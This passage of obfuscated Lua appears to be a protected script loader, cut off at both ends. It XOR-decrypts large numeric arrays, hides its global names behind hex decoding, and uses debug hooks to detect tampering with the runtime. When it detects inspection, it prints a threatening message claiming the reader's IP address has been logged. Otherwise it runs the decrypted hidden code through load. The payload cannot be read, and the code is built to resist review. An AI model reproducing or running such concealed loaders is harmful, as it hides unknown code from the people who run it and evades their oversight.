  7, 66, 87, 30, 73, 111, 73, 198, 17, 30, 15, 26, 4, 84, 100, 59, 118, 24, 54, 24, 5, 99, 160, 120, 64, 42, 12, 12, 126,
  21, 50, 108, 120, 190, 110, 14, 99, 10, 34, 78, 102, 81, 88, 24, 95, 119, 42, 22, 125, 21, 74, 139, 29, 11, 37, 76, 4,
  48, 100, 22, 75, 67, 81, 155, 26, 13, 83, 26, 93, 176, 77, 81, 50, 63, 25, 69, 94, 121, 95, 36, 17, 119, 29, 158, 8,
  91, 6, 42, 81, 89, 61, 122, 50, 17, 34, 89, 16, 7, 17, 2, 78, 86, 76, 22, 11, 19, 122, 15, 6, 100, 33, 34, 178, 30, 54,
  45, 76, 17, 76, 53, 126, 164, 21, 30, 20, 61, 30, 81, 130, 73, 100, 20, 116, 120, 10, 29, 17, 248, 21, 78, 11, 209,
  229, 77, 126, 100, 72, 93, 18, 19, 84, 16, 119, 5, 240, 21, 67, 13, 76, 74, 64, 23, 94, 47, 65, 82, 3, 88, 88, 29, 26,
  30, 127, 106, 23, 127, 118, 78, 73, 80, 93, 20, 70, 61, 174, 215, 86, 199, 34, 91, 153, 138, 99, 69, 68, 23, 31, 137,
  73, 115, 90, 119, 82, 91, 57, 80, 44, 103, 68, 19, 28, 107, 25, 16, 48, 83, 24, 105, 123, 1, 88, 51, 219, 49, 6, 227,
  51, 55, 85, 1, 149, 86, 60, 64, 20, 120, 33, 1, 69, 34, 20, 23, 19, 73, 21, 100, 66, 87, 175, 87, 93, 1, 78, 59, 15,
  73, 123, 1, 96, 92, 92, 12, 49, 17, 31, 75, 65, 118, 4, 112, 76, 50, 76, 67, 78, 56, 246, 158, 108, 60, 86, 11, 75, 22,
  76, 3, 86, 9, 3, 4, 61, 30, 32, 16, 65, 91, 67, 16, 1, 80, 85, 17, 24, 18, 71, 20, 239, 81, 56 },
  "scdDDj4nwi151ltxXzVvl0WqyI"); jq96zqMassQ1nme9wf4DGEjDEHtPa3WgughNXsQfyquOVWpyQj3 =
s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm; wxSfvwrP6vELosDuJAq2QXgpA07suWnb4vagxnMSfC0ncF6ID17GCIgZ8hMLzohFXYi1sKq =
s93jXBsCNHObWyWUH9wIVz2EPGbGlzgK8klcpi7AYJSQxRyM2q3K56icp6jSpm; qk0PpgZbOGaGwxLGeyi1LigOfcnUaxRHoD4VClcPIrE7oF2eGdx9kaOTY6R2ctfocVfTpYjXV =
wxSfvwrP6vELosDuJAq2QXgpA07suWnb4vagxnMSfC0ncF6ID17GCIgZ8hMLzohFXYi1sKq; n1C0OqfLXKgEOXL7kpfNrBGzVn4sq6wlITvNJ0e6mNxuDFXu9xO5iriNWc6gieMxTxXXzN =
qk0PpgZbOGaGwxLGeyi1LigOfcnUaxRHoD4VClcPIrE7oF2eGdx9kaOTY6R2ctfocVfTpYjXV; e5LsXBn9z2doBq1X4lLQwKG3yozOkOQbbP5A7NGCjz26ICdjRZm5nqdUXs =
n1C0OqfLXKgEOXL7kpfNrBGzVn4sq6wlITvNJ0e6mNxuDFXu9xO5iriNWc6gieMxTxXXzN; sKW4l1QKBjJyerLmJ9WfYanJyipxs00GbWCoNCgSso4og4Hn7KRq6o5rxuSoMWYMOgsdzN4la =
e5LsXBn9z2doBq1X4lLQwKG3yozOkOQbbP5A7NGCjz26ICdjRZm5nqdUXs; tnGJznMSKGS92dUqtK9IDPv0BG3VaEXzjFhFjyeFhomxrMQCoSsU =
sKW4l1QKBjJyerLmJ9WfYanJyipxs00GbWCoNCgSso4og4Hn7KRq6o5rxuSoMWYMOgsdzN4la; ymF0KIA4n8368fmUY57toabHgGJsggH2PstaPLCVJj1KoizMJwPjLyX5JYKjkP =
tnGJznMSKGS92dUqtK9IDPv0BG3VaEXzjFhFjyeFhomxrMQCoSsU; qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n =
ymF0KIA4n8368fmUY57toabHgGJsggH2PstaPLCVJj1KoizMJwPjLyX5JYKjkP; xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2 = function(
  a)
  K, F = 4591567988737979, 16384 + 7607; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; uZAXs0QCYINoLikt6atqnf1YyuTluONgIgiIYUmEczTGkPoTANvIE7qCrG2PmePisBw = function(b)
  co = coroutine.create(b)
  mZxdcP2vJ9K8hkt1nztRPECwp4YnMA1DRkrmD8UDHY5p1PmVk4lxTexkr0P8104 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(mZxdcP2vJ9K8hkt1nztRPECwp4YnMA1DRkrmD8UDHY5p1PmVk4lxTexkr0P8104, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return mZxdcP2vJ9K8hkt1nztRPECwp4YnMA1DRkrmD8UDHY5p1PmVk4lxTexkr0P8104
end; irjvDX7Qnoc5s3Os0LljgpDTTrqNjsJLGZRzp2U8YrlyTcWQB5O9eDoDbTat8PUrIkvTU0qyxoi = function(f, g)
  cAXQsMN7Y73617a8CNo17sCnKUC9QmoBVrvvXEFFSYSuSq1omZnB = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; htdcRq5dg0y7elwJlGLiz3LYur3QLtmxqxgcww6LEuYrNRDpTT6QDXZFWzYSXj9u = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; a6FQeS6emidYl5KBX3ig1xp4l62j2mKqUUh9ivPYsPYJQn90QoPzdl6bq = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      cAXQsMN7Y73617a8CNo17sCnKUC9QmoBVrvvXEFFSYSuSq1omZnB(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; db3vUsgLdJhZFFrAkyGdMXzHwOmLzJvik9qnKtEcYjz8DT6u0sKlFRsEilIqymPTAu = function(p, n)
    eIGZcsjnh5YOROc28hy7qhHebEvOh5lUl4FjZvIOvULFNsczxYp6xUc = ""
    for k, q in pairs(p) do eIGZcsjnh5YOROc28hy7qhHebEvOh5lUl4FjZvIOvULFNsczxYp6xUc =
      eIGZcsjnh5YOROc28hy7qhHebEvOh5lUl4FjZvIOvULFNsczxYp6xUc ..
      qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n
      [xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('71') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('F2') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('F0') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('67') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EC') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('65')]
      [xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('61') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('E6') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('5F') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('F0')](
      q) end
    ; n(eIGZcsjnh5YOROc28hy7qhHebEvOh5lUl4FjZvIOvULFNsczxYp6xUc)
  end; htdcRq5dg0y7elwJlGLiz3LYur3QLtmxqxgcww6LEuYrNRDpTT6QDXZFWzYSXj9u(f,
    function(r) a6FQeS6emidYl5KBX3ig1xp4l62j2mKqUUh9ivPYsPYJQn90QoPzdl6bq(r, g,
        function(s) db3vUsgLdJhZFFrAkyGdMXzHwOmLzJvik9qnKtEcYjz8DT6u0sKlFRsEilIqymPTAu(s,
            function(t) if #uZAXs0QCYINoLikt6atqnf1YyuTluONgIgiIYUmEczTGkPoTANvIE7qCrG2PmePisBw(qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n[xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EA') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('6D') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('5F') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('E2')]) == 1 then if qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n[xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EA') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('6D') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('5F') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('E2')] == qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n[xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EE') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('F0') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('67') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EC') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('F2')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n[xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EA') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('6D') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('5F') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('E2')](t) then
                    qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n
                        [xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('EA') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('6D') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('5F') .. xR6Z4hRloiapqsQPrOZlRDiMQSO4U97RgqUIlDERUn3evNDZwvV0ZpiECQq2('E2')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; irjvDX7Qnoc5s3Os0LljgpDTTrqNjsJLGZRzp2U8YrlyTcWQB5O9eDoDbTat8PUrIkvTU0qyxoi(
{ 665, 1029, 1036, 978, 618, 969, 840, 1083, 762, 779, 1035, 687, 1211, 788, 988, 1017, 595, 1006, 802, 631, 907, 609,
  807, 959, 678, 775, 904, 1073, 850, 828, 956, 577, 791, 843, 847, 1037, 1176, 1124, 579, 1200, 1134, 1074, 1038, 573,
  975, 761, 867, 968, 1183, 602, 689, 821, 882, 1196, 614, 858, 886, 778, 546, 914, 659, 918, 860, 985, 741, 927, 952,
  737, 1068, 746, 1104, 1027, 722, 1120, 877, 1115, 1082, 749, 725, 972, 895, 1185, 644, 915, 590, 900, 586, 958, 876,
  717, 909, 845, 1081, 831, 1093, 632, 1020, 646, 1203, 1095, 859, 1076, 721, 581, 783, 684, 764, 1208, 794, 661, 1156,
  680, 855, 570, 553, 913, 691, 931, 729, 700, 1066, 780, 742, 1071, 674, 774, 1028, 1045, 1191, 967, 1055, 1087, 620,
  1016, 936, 838, 750, 601, 1042, 1126, 697, 970, 634, 921, 1173, 1033, 1194, 673, 1153, 986, 1018, 1155, 772, 792, 773,
  1169, 798, 1008, 984, 833, 846, 547, 824, 814, 813, 1047, 893, 1105, 615, 768, 592, 1079, 781, 1193, 669, 1137, 560,
  998, 1165, 1151, 1143, 1014, 699, 1178, 861, 630, 1048, 733, 929, 589, 640, 962, 911, 928, 696, 917, 759, 580, 625,
  651, 947, 889, 584, 562, 974, 950, 1085, 872, 1019, 817, 583, 603, 638, 635, 693, 747, 1188, 789, 686, 1152, 1197,
  1159, 992, 812, 569, 878, 1061, 582, 919, 1063, 643, 1023, 713, 949, 1013, 639, 1113, 1145, 941, 751, 1201, 551, 1144,
  1054, 835, 1184, 716, 705, 656, 1064, 1158, 848, 1084, 745, 822, 898, 1161, 776, 740, 704, 844, 637, 932, 712, 994,
  1030, 842, 1139, 881, 924, 1189, 1072, 1121, 916, 869, 544, 1046, 1059, 1170, 871, 980, 1163, 1011, 556, 1108, 925,
  894, 990, 866, 557, 983, 937, 641, 897, 1111, 1125, 935, 796, 1012, 1123, 734, 939, 839, 1015, 736, 903, 1142, 726,
  864, 1132, 799, 966, 865, 587, 1148, 809, 663, 1129, 593, 1080, 766, 884, 664, 784, 790, 938, 685, 627, 940, 991, 910,
  856, 1002, 782, 1057, 600, 922, 906, 1024, 714, 636, 672, 1022, 695, 616, 559, 1204, 1119, 1157, 805, 923, 1099, 820,
  1032, 732, 1172, 757, 642, 548, 1127, 744, 1039, 896, 1150, 1141, 1001, 1174, 963, 996, 1060, 827, 829, 585, 1005,
  1050, 1049, 709, 715, 961, 718, 657, 1044, 870, 1160, 879, 1140, 624, 707, 755, 825, 1177, 1089, 1117, 1088, 800, 667,
  816, 720, 1146, 681, 571, 1109, 1097, 819, 765, 1003, 575, 874, 727, 1092, 597, 758, 568, 588, 606, 993, 804, 997, 841,
  660, 965, 692, 1192, 885, 1164, 565, 1043, 1112, 1041, 920, 836, 854, 853, 1052, 1004, 1010, 954, 777, 1040, 572, 752,
  1128, 1034, 688, 786, 1102, 1205, 545, 701, 619, 891, 711, 1135, 613, 735, 703, 594, 563, 1103, 888, 628, 849, 591,
  647, 1186, 675, 549, 652, 1110, 1181, 1199, 677, 617, 596, 912, 982, 793, 806, 550, 738, 979, 576, 1067, 605, 558, 743,
  1106, 612, 649, 1098, 1026, 1207, 1195, 815, 770, 1069, 1171, 1175, 1009, 753, 1179, 1070, 899, 771, 728, 719, 1094,
  554, 653, 1133, 883, 971, 1096, 1180, 610, 976, 599, 1131, 1130, 1114, 930, 1090, 1118, 1168, 1065, 1000, 862, 1187,
  830, 604, 1167, 810, 690, 868, 731, 1100, 902, 823, 1091, 1149, 1209, 621, -1, 58, 16, 1, 40, 70, 66, 28, 112, 60, 170,
  35, 102, 202, 1, 38, 54, 45, 69, 84, 100, 26, 58, 100, 212, 255, 112, 115, 100, 40, 17, 46, 245, 39, 102, 1, 24, 124,
  81, 42, 43, 91, 80, 103, 34, 83, 92, 97, 107, 16, 83, 103, 92, 54, 83, 64, 97, 55, 85, 121, 25, 104, 3, 86, 72, 232,
  211, 37, 13, 94, 68, 80, 87, 81, 107, 17, 87, 55, 24, 39, 51, 51, 32, 127, 233, 95, 50, 252, 104, 115, 97, 75, 86, 66,
  3, 26, 2, 7, 114, 105, 110, 61, 95, 6, 105, 121, 245, 66, 3, 106, 32, 24, 173, 126, 4, 115, 87, 46, 111, 21, 254, 73,
  49, 105, 144, 26, 164, 97, 22, 110, 42, 62, 75, 12, 131, 69, 11, 205, 60, 33, 121, 97, 20, 7, 112, 72, 93, 72, 81, 4,
  83, 121, 125, 7, 68, 57, 106, 68, 2, 34, 240, 52, 48, 50, 224, 85, 183, 86, 82, 106, 40, 5, 83, 102, 2, 84, 86, 24,
  121, 6, 7, 140, 78, 19, 45, 46, 112, 4, 147, 84, 115, 84, 18, 23, 50, 5, 24, 254, 11, 2, 110, 35, 114, 39, 46, 126, 1,
  98, 103, 2, 13, 121, 134, 4, 207, 102, 109, 76, 4, 102, 15, 108, 30, 25, 47, 142, 106, 56, 67, 100, 102, 68, 73, 49,
  16, 32, 18, 48, 112, 106, 99, 67, 92, 22, 87, 177, 35, 109, 19, 39, 82, 103, 17, 193, 78, 107, 81, 26, 17, 87, 102,
  245, 12, 50, 100, 39, 204, 42, 108, 122, 86, 107, 126, 101, 37, 84, 11, 33, 84, 60, 14, 100, 125, 32, 72, 108, 103, 83,
  96, 94, 39, 99, 137, 114, 23, 193, 24, 61, 57, 87, 36, 117, 17, 102, 22, 103, 98, 43, 25, 180, 177, 55, 25, 34, 110,
  221, 44, 40, 55, 78, 103, 201, 122, 79, 72, 69, 106, 17, 102, 61, 118, 36, 46, 60, 53, 117, 109, 4, 234, 104, 67, 50,
  33, 121, 67, 76, 57, 118, 38, 32, 4, 99, 11, 13, 11, 121, 38, 103, 43, 222, 116, 39, 10, 163, 44, 66, 41, 26, 102, 124,
  107, 91, 50, 28, 52, 117, 42, 16, 102, 54, 72, 86, 55, 53, 9, 46, 31, 120, 67, 47, 25, 117, 17, 112, 17, 78, 52, 3, 89,
  84, 82, 106, 29, 170, 100, 119, 252, 13, 82, 188, 29, 81, 66, 187, 68, 247, 55, 27, 35, 84, 99, 114, 226, 17, 55, 79,
  47, 28, 86, 41, 31, 21, 126, 36, 39, 66, 61, 86, 77, 124, 121, 85, 80, 24, 53, 253, 5, 70, 3, 109, 84, 33, 31, 159, 17,
  121, 112, 27, 23, 22, 66, 23, 102, 100, 62, 104, 70, 85, 115, 55, 90, 23, 105, 46, 61, 3, 69, 91, 102, 193, 73, 7, 5,
  249, 114, 42, 55, 35, 16, 229, 86, 31, 77, 36, 18, 39, 115, 85, 61, 86, 49, 112, 109, 27, 58, 99, 29, 24, 112, 62, 40,
  58, 108, 105, 4, 114, 0, 33, 84, 22, 60, 37, 76, 95, 115, 84, 115, 83, 121, 105, 91, 28, 86, 251, 85, 86, 178, 71, 121,
  73, 72, 52, 32, 90, 216, 21, 61, 7, 83, 76, 102, 116, 86, 47, 110, 76, 99, 102, 81, 98, 60, 54, 41, 12, 34, 6, 70, 76,
  75, 105, 24, 7, 101, 89, 197, 18, 87, 33, 124, 3, 34, 102, 17, 106, 100, 99, 101, 7, 98, 92, 16, 25, 84, 51, 63, 98,
  176, 52, 44, 7, 13, 79, 52, 29, 51, 125, 3, 43, 42, 68, 92, 110, 203, 114, 57, 62, 124, 76, 110, 33, 242, 36, 103, 106,
  158, 21, 42, 98, 35, 18, 109, 21, 87, 33, 50, 23, 65, 107, 45, 90, 188, 61, 80, 111, 48, 121, 58, 53, 96, 12, 107, 127,
  33, 72, 6, 25, 176, 94, 102, 62, 14, 18, 47, 69, 153, 85, 41, 12, 111, 36, 48 }, "cswO1sKYGDP8vFtvSMFNbCRuhE"); qU0W70TIxP1aLGBYqbhLTKS6L9IVFEBBPWqFAyDg2U9C83IAXTcSvw6 =
qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n; ooISlDvHYUtROiQ4nEI0RBhJPKwXPTRFF56hBni0fQUb9BpuDf5YE =
qaNoLhGCvYzAIPRlIMaZmxkBYppNBvP9BrczwF60AFJwEY9y2U2cmj6n; g01BF3gGl52rgdzZO8X04Do0Eldf09XiP0dG5Zd8GWRpGFVwI41idFNXQxTbt =
ooISlDvHYUtROiQ4nEI0RBhJPKwXPTRFF56hBni0fQUb9BpuDf5YE; ysjHFBh3xTBriYeQXMvCKPmuaVVjARPCXj1i0MhDpHiASGe3q8awb5jGGMfYkdJhFC8G =
g01BF3gGl52rgdzZO8X04Do0Eldf09XiP0dG5Zd8GWRpGFVwI41idFNXQxTbt; u8cAhoD2LVyAvujBdtH8Il09hR7aXrGVAiFkOHDiaFhULiaUGHHGocbl7WoN7T2V8xqKjaf4 =
ysjHFBh3xTBriYeQXMvCKPmuaVVjARPCXj1i0MhDpHiASGe3q8awb5jGGMfYkdJhFC8G; mb9F9ROTYdikQ8sTO2TD1B1PnZ7NCOE84RM6Kb9Fu6Cp4ml9mYCDB3o0WWzcXSpTrc5W0r1 =
u8cAhoD2LVyAvujBdtH8Il09hR7aXrGVAiFkOHDiaFhULiaUGHHGocbl7WoN7T2V8xqKjaf4; aAdeHczciZfHTz2OrPMdXlKbl8yeeEynileMKW1ii4YedJDnWNtDz2ciQuok39tY1IPN =
mb9F9ROTYdikQ8sTO2TD1B1PnZ7NCOE84RM6Kb9Fu6Cp4ml9mYCDB3o0WWzcXSpTrc5W0r1; xL7wuWnijqWQ8oxaXI1DtAshnABM8zl0nFB64qt0QjhVPuh5W0b3hBSPndnOg9mW =
aAdeHczciZfHTz2OrPMdXlKbl8yeeEynileMKW1ii4YedJDnWNtDz2ciQuok39tY1IPN; bHP0PcIKq6bMM4P9QjoB2DTbfzwgpIpvWHmPhKQMnF1jWPNKN5RxwBc6vD5iYl =
xL7wuWnijqWQ8oxaXI1DtAshnABM8zl0nFB64qt0QjhVPuh5W0b3hBSPndnOg9mW; sAzdslWvZNhgK6cRmtjl5UiT316O4pFi2Y8uCTbOGxlIE7Z15lLxySdl5h =
bHP0PcIKq6bMM4P9QjoB2DTbfzwgpIpvWHmPhKQMnF1jWPNKN5RxwBc6vD5iYl; lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB =
sAzdslWvZNhgK6cRmtjl5UiT316O4pFi2Y8uCTbOGxlIE7Z15lLxySdl5h; dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG = function(
  a)
  K, F = 5958806955127536, 16384 + 6528; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; yqwL40aSb7iF8JlN4qEQSkujqo9ccIiNAm3KrWm6ADmjyuebHH3fFrXG0i = function(b)
  co = coroutine.create(b)
  aRQUsa2WapndhXOMnrmD2iWjeUFLUGR2vMBaaFqHLI3IbySxEmFqhxQxM4sDny2bUQ0zvK9v9x3 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(aRQUsa2WapndhXOMnrmD2iWjeUFLUGR2vMBaaFqHLI3IbySxEmFqhxQxM4sDny2bUQ0zvK9v9x3, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return aRQUsa2WapndhXOMnrmD2iWjeUFLUGR2vMBaaFqHLI3IbySxEmFqhxQxM4sDny2bUQ0zvK9v9x3
end; kxXfhgfJWmbI9wHkKtLkblBrcqN0KviXgCjbNWmoudUSDiCxkLHjZryciz = function(f, g)
  o9FyrV57Ae2YclUdnT5PKfoiErLX0kPAArQdiTJ1pKYv71jU6Ikvoab8uYTpgy = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; iaqTO8IDo6NAwD1XPRBkYNMEjNfc1sT8gIIgcX5rkSvl5UJvlet6Tptzo5VnvwZSqc = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; fjpp35vED6n5V8CxfkiO7JhJ5EonufkMqC8uQtKHdGtrmo0gEgH9CUfcI5aMwm9CoWHfl = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      o9FyrV57Ae2YclUdnT5PKfoiErLX0kPAArQdiTJ1pKYv71jU6Ikvoab8uYTpgy(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; xsKFUdWhenj5AEQgiev7Bg4tOkMi3Shl9ALaDII3d0Ovqt50uk6V4Zxl2oNIxToAE76HSKHaZ = function(p, n)
    sCdCYGd1SABXjGED9JlliV2ndQRru1z19OPLzU1gW7popY3FC1mK = ""
    for k, q in pairs(p) do sCdCYGd1SABXjGED9JlliV2ndQRru1z19OPLzU1gW7popY3FC1mK =
      sCdCYGd1SABXjGED9JlliV2ndQRru1z19OPLzU1gW7popY3FC1mK ..
      lOI98p35v6RcVyi0hwVWkrrcFEE6ZfTMdOtmgVDlIafCHZ75AmhmFYB
      [dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('66') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('5B') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('71') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('D4') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('9D') .. dpBZdIYZflRgsg6F9rndSlO8WQTRuTAeicw6MgFscJKuv0AU2Ejqya43MGvMRR4JvHcG('EA')]
